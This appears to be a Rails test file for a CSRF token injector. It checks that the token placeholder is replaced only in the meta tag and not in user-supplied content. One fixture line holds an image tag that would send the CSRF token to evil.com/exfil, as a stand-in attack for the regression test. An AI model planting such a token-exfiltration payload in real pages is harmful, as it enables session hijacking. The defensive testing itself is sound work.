# frozen_string_literal: true

require "test_helper"

class AnonymousCsrfTokenInjectorTestController < ActionController::Base
  include CsrfTokenInjector

  def action
    html_body = <<-HTML
    <html>
      <head>
        <meta name="csrf-param" content="authenticity_token">
        <meta name="csrf-token" content="_CROSS_SITE_REQUEST_FORGERY_PROTECTION_TOKEN__">
      </head>
      <body></body>
    </html>
    HTML
    render inline: html_body
  end

  def action_with_user_content
    user_bio = '<img src="https://evil.com/exfil?t=_CROSS_SITE_REQUEST_FORGERY_PROTECTION_TOKEN__">'
    html_body = <<-HTML
    <html>
      <head>
        <meta name="csrf-param" content="authenticity_token">
        <meta name="csrf-token" content="_CROSS_SITE_REQUEST_FORGERY_PROTECTION_TOKEN__">
      </head>
      <body>
        <div class="user-bio">#{user_bio}</div>
      </body>
    </html>
    HTML
    render inline: html_body
  end
end

class CsrfTokenInjectorTest < ActionController::TestCase
  tests AnonymousCsrfTokenInjectorTestController

  setup do
    @routes = ActionDispatch::Routing::RouteSet.new
    @routes.draw do
      get :action, to: "anonymous_csrf_token_injector_test#action"
      get :action_with_user_content, to: "anonymous_csrf_token_injector_test#action_with_user_content"
    end
  end

  # forgery protection is disabled in test env; override to enable injection branch.
  def with_forgery_protection
    original = ActionController::Base.instance_method(:protect_against_forgery?)
    ActionController::Base.define_method(:protect_against_forgery?) { true }
    yield
  ensure
    ActionController::Base.define_method(:protect_against_forgery?, original)
  end

  test "replaces CSRF token placeholder with dynamic value" do
    with_forgery_protection do
      get :action
    end
    refute_includes response.body, "_CROSS_SITE_REQUEST_FORGERY_PROTECTION_TOKEN__"
    token = Nokogiri::HTML(response.body).at_xpath("//meta[@name='csrf-token']/@content").value
    assert_predicate token, :present?
  end

  test "does not replace placeholder in user-controlled content" do
    with_forgery_protection do
      get :action_with_user_content
    end
    doc = Nokogiri::HTML(response.body)
    meta_token = doc.at_xpath("//meta[@name='csrf-token']/@content").value
    assert_predicate meta_token, :present?
    refute_equal "_CROSS_SITE_REQUEST_FORGERY_PROTECTION_TOKEN__", meta_token

    user_bio_content = doc.at_css(".user-bio").inner_html
    assert_includes user_bio_content, "_CROSS_SITE_REQUEST_FORGERY_PROTECTION_TOKEN__"
  end
end
